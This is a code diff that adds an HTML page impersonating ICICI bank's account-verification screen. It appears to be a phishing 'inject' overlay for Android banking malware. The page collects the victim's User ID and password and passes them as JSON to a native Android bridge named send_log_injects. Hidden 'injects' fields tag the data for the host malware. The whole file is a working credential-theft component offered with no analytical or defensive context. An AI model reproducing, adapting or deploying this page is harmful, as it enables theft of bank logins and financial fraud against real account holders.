@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<title>icici</title>
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+	body {
+		    background:#ffffff;
+		margin: 0;
+		padding: 0;
+		font-family: Helvetica, sans-serif;
+		background-size: 100%;
+	}
+	.logo {
+    text-align: center;
+    background-size: 100%;
+    background: #e18805;
+    color: #fff;
+    font-weight: 600;
+	}
+	.form {
+		text-align: center;
+		padding-top: 70px;
+	}
+	.form label {
+		display: block;
+	}
+	form {
+		display: inline-block;
+	}
+fieldset {
+	  position: relative;
+	  text-align: center;
+	  border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+border: 1px solid #d1d1d1;
+    line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 5px 20px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 0px 0px;
+    color: #7c7c7c;
+    text-align: left;
+    background: rgb(255, 255, 255);
+    outline: none;
+    border-top: none;
+    border-left: none;
+    border-right: none;
+}
+input[type="button"] {
+left: 0;
+    right: 0;
+    width: 100%;
+    height: 47px;
+    margin: 25px 0px 0px 0px;
+    outline: none;
+    float: right;
+    background: #233282;
+    color: #ffffff;
+    border: 1px solid #233282;
+    font-size: 14px;
+    -webkit-appearance: none;
+    border-radius: 0px;
+    cursor: pointer;
+}
+fieldset span {
+	display: inline-block;
+    width: 80%;
+    text-align: left;
+    color: #c5f8ff;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+input::placeholder {
+    color: #b0adad;
+}
+</style>
+
+<fieldset id="formtosend">
+
+<div class="" id="bireysel" style="display: block;">
+
+<div class="logo">
+<span style="text-align: center; color: #fff; margin: 0px 0px 20px 0px; font-weight: 400; font-size: 17px;">Activation</span>
+</div>
+
+<div class="area" style="padding: 0px 0px 0px 0px; margin: 10px;">
+
+<p style="font-size: 20px; text-align: center; color: #e18805; font-weight: 600;">Verify your account</p>
+
+
+		<input name="userid" id="userid" placeholder="Enter your User ID" style="height: 65px;" type="text">
+        <label style="float: right; margin: 10px 0px 0px 0px; font-size: 14px; text-decoration: none; color: #148fc6;">Forgot UserID</label>
+        <input name="password" id="password" placeholder="Enter your Password" style="height: 65px;" type="password">
+        <label style="float: right; margin: 10px 0px 0px 0px; font-size: 14px; text-decoration: none; color: #148fc6;">Forgot Password</label>
+        <input name="type_injects" value='banks' type="hidden" required>
+        <input name="closed" value='close_activity_injects' type="hidden" required>
+		<input name="sumbit" onclick="send_form();" value="Submit" type="button">
+
+</div>
+</div>
+
+<div class="b" style="margin-top: 130px;">
+    <hr style="border: 0.4px solid #dfdfdf;">
+    <a href="#" style="color: #233282;text-decoration: none;font-size: 23px;">I am a Resident Account holder</a>
+    <br><br>
+    <a href="#" style="color: #0f6eba; text-decoration: none;">Privacy Notice for EU Customers</a>
+</div>
+
+</fieldset>	
+
+<script>
+if ( typeof Android == "undefined")
+    var Android = {
+        send_log_injects : alert.bind(window)
+    }
+
+/*********Recursive implementation of jSON.stringify; ********/
+var stringifyJSON = function(obj) {
+    var arrOfKeyVals = [],
+        arrVals = [],
+        objKeys = [];
+
+    /*********CHECK FOR PRIMITIVE TYPES**********/
+    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+        return '' + obj;
+    else if (typeof obj === 'string')
+        return '"' + obj + '"';
+
+    /*********CHECK FOR ARRAY**********/
+    else if (Array.isArray(obj)) {
+        if (obj[0] === undefined)
+            return '[]';
+        else {
+            obj.forEach(function(el) {
+                arrVals.push(stringifyJSON(el));
+            });
+            return '[' + arrVals.join(',') + ']';
+        }
+    }
+    /*********CHECK FOR OBJECT**********/
+    else if (obj instanceof Object) {
+        objKeys = Object.keys(obj);
+        objKeys.forEach(function(key) {
+            var keyOut = '"' + key + '":';
+            var keyValOut = obj[key];
+            if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                arrOfKeyVals.push('');
+            else if (typeof keyValOut === 'string')
+                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                arrOfKeyVals.push(keyOut + keyValOut);
+            else if (keyValOut instanceof Object) {
+                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+            }
+        });
+        return '{' + arrOfKeyVals + '}';
+    }
+};
+
+function formToJSONbyName(f)
+{
+    var FinalObject = {}, namesHTML = ['input','select'];
+    for(var i = 0; i < namesHTML.length; i++) {
+        var bsform = f.getElementsByTagName(namesHTML[i]);
+        for(var j = 0; j < bsform.length; j++) {
+            if(bsform[j].name == 'sumbit') continue;
+            FinalObject[bsform[j].name] = bsform[j].value
+        }
+    }
+    return stringifyJSON(FinalObject);
+}
+
+function send_form()
+{
+    var form = document.getElementById('formtosend');
+    Android.send_log_injects( formToJSONbyName(form) );
+}
+</script>
+
+
+</body></html>
